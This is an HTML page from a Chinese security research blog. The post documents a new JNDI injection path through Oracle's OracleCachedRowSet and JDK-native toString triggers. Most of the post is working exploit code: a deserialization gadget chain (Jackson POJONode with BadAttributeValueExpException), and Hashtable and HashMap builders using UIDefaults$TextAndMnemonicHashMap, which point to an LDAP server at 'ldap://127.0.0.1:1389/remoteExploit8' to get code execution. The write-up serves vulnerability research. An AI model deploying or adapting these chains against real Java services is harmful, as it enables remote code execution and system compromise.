@@ -1,0 +1,749 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="unam4">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="首发先知 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;14732 0x01  起因​		tj哥在调试某1day时，想找其他的触发点，最后找到了oracle数据库的jndi。 0x02 分析OracleCachedRowSet#getConnectionInternal  这里直接new了一个InitialContext  然后进行了lookup，然后触发。 oracle.jdbc.rowset">
+<meta property="og:type" content="article">
+<meta property="og:title" content="新jdk原生入口到jndi">
+<meta property="og:url" content="https://unam4.github.io/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/index.html">
+<meta property="og:site_name" content="unam4">
+<meta property="og:description" content="首发先知 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;14732 0x01  起因​		tj哥在调试某1day时，想找其他的触发点，最后找到了oracle数据库的jndi。 0x02 分析OracleCachedRowSet#getConnectionInternal  这里直接new了一个InitialContext  然后进行了lookup，然后触发。 oracle.jdbc.rowset">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://unam4.github.io/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/image-20240603204410886.png">
+<meta property="og:image" content="https://unam4.github.io/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/image-20240523154007471.png">
+<meta property="og:image" content="https://unam4.github.io/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/image-20240523154030734.png">
+<meta property="og:image" content="https://unam4.github.io/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/image-20240523154110189.png">
+<meta property="og:image" content="https://unam4.github.io/Volumes/data/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93jndi/image-20240523154231338.png">
+<meta property="og:image" content="https://unam4.github.io/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/image-20240523154307368.png">
+<meta property="og:image" content="https://unam4.github.io/Volumes/data/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93jndi/image-20240523154816831.png">
+<meta property="og:image" content="https://unam4.github.io/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/image-20240523170745040.png">
+<meta property="og:image" content="https://unam4.github.io/Volumes/data/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93jndi/image-20240521204318067.png">
+<meta property="og:image" content="https://unam4.github.io/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/image-20240521204924499.png">
+<meta property="article:published_time" content="2024-06-03T12:43:25.000Z">
+<meta property="article:modified_time" content="2024-06-03T12:45:02.712Z">
+<meta property="article:author" content="unam4">
+<meta property="article:tag" content="gadget">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://unam4.github.io/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/image-20240603204410886.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>新jdk原生入口到jndi - unam4</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"unam4.github.io","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>unam4&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/01.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="新jdk原生入口到jndi"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-03 20:43" pubdate>
+          2024年6月3日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          211 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          2 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">新jdk原生入口到jndi</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>首发先知 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14732">https://xz.aliyun.com/t/14732</a></p>
+<h2 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01  起因"></a>0x01  起因</h2><p>​		tj哥在调试某1day时，想找其他的触发点，最后找到了oracle数据库的jndi。</p>
+<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>OracleCachedRowSet#getConnectionInternal</p>
+<p><img src="image-20240603204410886.png" srcset="/img/loading.gif" lazyload alt="image-20240603204410886"></p>
+<p>这里直接new了一个InitialContext<img src="image-20240523154007471.png" srcset="/img/loading.gif" lazyload alt="image-20240523154007471"></p>
+<p><img src="image-20240523154030734.png" srcset="/img/loading.gif" lazyload alt="image-20240523154030734"></p>
+<p>然后进行了lookup，然后触发。</p>
+<p>oracle.jdbc.rowset.OracleRowSet#getDataSourceName</p>
+<p><img src="image-20240523154110189.png" srcset="/img/loading.gif" lazyload alt="image-20240523154110189"></p>
+<p>可以看到是直接获取这个属性。可控。</p>
+<p><img src="../../../../Volumes/data/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93jndi/image-20240523154231338.png" srcset="/img/loading.gif" lazyload alt="image-20240523154231338"></p>
+<p>抽象类，可序列化</p>
+<p><img src="image-20240523154307368.png" srcset="/img/loading.gif" lazyload alt="image-20240523154307368"></p>
+<p>oracle.jdbc.rowset.OracleCachedRowSet#getConnection 这个方法直接调用。</p>
+<p>那种想到需要触发OracleCachedRowSet的getter()方法就能触发。</p>
+<h2 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> oracle.jdbc.rowset.OracleCachedRowSet;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Oracle</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">OracleCachedRowSet</span> <span class="hljs-variable">oracleCachedRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OracleCachedRowSet</span>();<br><br><br><span class="hljs-comment">//        Field dataSourceName_1 = OracleCachedRowSet.class.getSuperclass().getDeclaredField(&quot;dataSourceName&quot;); dataSourceName_1.setAccessible(true); dataSourceName_1.set(oracleCachedRowSet, &quot;ldap://127.0.0.1:4444/dc=example,dc=com&quot;);</span><br>        oracleCachedRowSet.setDataSourceName(<span class="hljs-string">&quot;ldap://127.0.0.1:1389/remoteExploit8&quot;</span>);<br>        oracleCachedRowSet.getConnection();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="../../../../Volumes/data/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93jndi/image-20240523154816831.png" srcset="/img/loading.gif" lazyload alt="image-20240523154816831"></p>
+<p>日常jndi招呼计算器。</p>
+<h2 id="0x04-gadget"><a href="#0x04-gadget" class="headerlink" title="0x04 gadget"></a>0x04 gadget</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> test;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Oracle</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br><br>        <span class="hljs-type">OracleCachedRowSet</span> <span class="hljs-variable">oracleCachedRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OracleCachedRowSet</span>();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dataSourceName_1</span> <span class="hljs-operator">=</span> OracleCachedRowSet.class.getSuperclass().getDeclaredField(<span class="hljs-string">&quot;dataSourceName&quot;</span>);<br>        dataSourceName_1.setAccessible(<span class="hljs-literal">true</span>);<br>        dataSourceName_1.set(oracleCachedRowSet, <span class="hljs-string">&quot;ldap://127.0.0.1:1389/remoteExploit8&quot;</span>);<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vector</span>();<br>        v1.add(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;111&quot;</span>);<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vector</span>();<br>        v2.add(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;222&quot;</span>);<br>        utils.setFieldValue(oracleCachedRowSet, <span class="hljs-string">&quot;metaData&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;111&quot;</span>, <span class="hljs-string">&quot;222&quot;</span>&#125;);<br>        utils.setFieldValue(oracleCachedRowSet, <span class="hljs-string">&quot;matchColumnNames&quot;</span>, v1);<br>        utils.setFieldValue(oracleCachedRowSet, <span class="hljs-string">&quot;matchColumnIndexes&quot;</span>, v2);<br>        utils.setFieldValue(oracleCachedRowSet, <span class="hljs-string">&quot;monitorLock&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(oracleCachedRowSet);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        utils.setFieldValue(badAttributeValueExpException, <span class="hljs-string">&quot;val&quot;</span>, node);<br>        <span class="hljs-type">byte</span>[] serialize = utils.serialize(badAttributeValueExpException);<br>        utils.unserialize(serialize);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="image-20240523170745040.png" srcset="/img/loading.gif" lazyload alt="image-20240523170745040"></p>
+<p>招呼计算器成功</p>
+<h2 id="0x05-jdk原生gadget"><a href="#0x05-jdk原生gadget" class="headerlink" title="0x05 jdk原生gadget"></a>0x05 jdk原生gadget</h2><p>​	那要是常见触发tostring的类（若badAttributeValueExpException）被搬掉了，没别的依赖。</p>
+<p>所以现在需要找一条新的tostring。</p>
+<p>javax.swing.UIDefaults.TextAndMnemonicHashMap</p>
+<p><img src="../../../../Volumes/data/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93jndi/image-20240521204318067.png" srcset="/img/loading.gif" lazyload alt="image-20240521204318067"></p>
+<p>可以看到是map,然后调用了key的tostring，非常完美。</p>
+<p>java.util.AbstractMap#equals</p>
+<p><img src="image-20240521204924499.png" srcset="/img/loading.gif" lazyload alt="image-20240521204924499"></p>
+<p>m是一个map，改成javax.swing.UIDefaults.TextAndMnemonicHashMap就可以走通，非常合理，java.util.AbstractMap是一个抽象类，所以我们只要找一个继承它又没有实现equals的方法就行了,感觉非常多了，haspmap，hashtable都可以。</p>
+<h4 id="hashtable触发tostring"><a href="#hashtable触发tostring" class="headerlink" title="hashtable触发tostring"></a>hashtable触发tostring</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable <span class="hljs-title function_">makeTableTstring</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap1</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap2</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    tHashMap1.put(o,<span class="hljs-string">&quot;yy&quot;</span>);<br>    tHashMap2.put(o,<span class="hljs-string">&quot;zZ&quot;</span>);<br>    setFieldValue(tHashMap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    setFieldValue(tHashMap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br><br>    <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>    hashtable.put(tHashMap1,<span class="hljs-number">1</span>);<br>    hashtable.put(tHashMap2,<span class="hljs-number">1</span>);<br><br>    tHashMap1.put(o, <span class="hljs-literal">null</span>);<br>    tHashMap2.put(o, <span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">return</span> hashtable;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="hashmap触发tostring"><a href="#hashmap触发tostring" class="headerlink" title="hashmap触发tostring"></a>hashmap触发tostring</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">maskmapToString</span><span class="hljs-params">( Object o1,  Object o2)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap1</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap2</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    tHashMap1.put(o1,<span class="hljs-literal">null</span>);<br>    tHashMap2.put(o2,<span class="hljs-literal">null</span>);<br>    setFieldValue(tHashMap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    setFieldValue(tHashMap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> node.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, node);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, tHashMap1, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, tHashMap2, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> node.getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> Field.class.getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br>    modifiers.setAccessible(<span class="hljs-literal">true</span>);<br>    modifiers.setInt(key, key.getModifiers() &amp; ~Modifier.FINAL);<br>    key.setAccessible(<span class="hljs-literal">true</span>);<br>    key.set(node1, tHashMap1);<br>    key.set(node2, tHashMap2);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> HashMap.class.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>    size.setAccessible(<span class="hljs-literal">true</span>);<br>    size.set(hashMap, <span class="hljs-number">2</span>);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>    table.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">arr</span> <span class="hljs-operator">=</span> Array.newInstance(node, <span class="hljs-number">2</span>);<br>    Array.set(arr, <span class="hljs-number">0</span>, node1);<br>    Array.set(arr, <span class="hljs-number">1</span>, node2);<br>    table.set(hashMap, arr);<br>    <span class="hljs-keyword">return</span> hashMap;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/gadget/" class="print-no-link">#gadget</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>新jdk原生入口到jndi</div>
+      <div>https://unam4.github.io/2024/06/03/新jdk原生入口到jndi/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>unam4</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/03/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0-1/" title="静态恶意代码逃逸学习(1)">
+                        <span class="hidden-mobile">静态恶意代码逃逸学习(1)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'unam4/unam4-commect');
